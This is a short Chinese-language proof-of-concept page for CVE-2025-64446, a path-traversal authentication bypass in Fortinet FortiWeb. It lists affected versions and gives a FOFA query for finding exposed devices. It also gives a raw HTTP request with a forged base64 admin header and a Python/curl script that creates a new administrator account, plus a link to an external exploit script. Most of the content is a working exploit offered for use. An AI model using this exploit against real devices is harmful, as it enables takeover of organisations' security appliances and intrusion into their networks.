# Fortinet FortiWeb身份认证绕过漏洞CVE-2025-64446

# 一、漏洞简介
Fortinet FortiWeb 8.0.0至8.0.1版本、FortiWeb 7.6.0至7.6.4版本、FortiWeb 7.4.0至7.4.9版本、FortiWeb 7.2.0至7.2.11版本以及FortiWeb 7.0.0至7.0.11版本中存在相对路径遍历漏洞，攻击者可能通过精心制作的HTTP或HTTPS请求在系统上执行管理命令。CVE编号:CVE-2025-64446

## fofa

```yaml
title="fortiweb - "
```

## POC

```java
GET /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: xx.xxx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
```


```python
python3 - <<'PY'
import base64, json, subprocess
header = base64.b64encode(json.dumps({
        "username": "admin",
        "profname": "prof_admin",
        "vdom": "root",
        "loginname": "admin"
}).encode()).decode()

payload = json.dumps({
    "data": {
        "q_type": 1,
        "name": "note2",
        "access-profile": "prof_admin",
        "password": "note2",
        "comment": "automated RCE"
    }
})

cmd = [
    "curl", "--path-as-is", "-sk",
    "-H", f"CGIINFO: {header}",
    "-H", "Content-Type: application/json",
    "--data", payload,
    "https://localhost:38443/api/v2.0/cmdb/system/admin%3f/../../../cgi-bin/fwbcgi"
]
print(subprocess.run(cmd, capture_output=True, text=True).stdout)
PY

Output from the box:

{ "results": { "name": "note2", "access-profile": "prof_admin", ... } }
```

## python脚本
```python
https://github.com/D3crypT0r/CVE-2025-64446/blob/main/CVE-2025-64446.py
```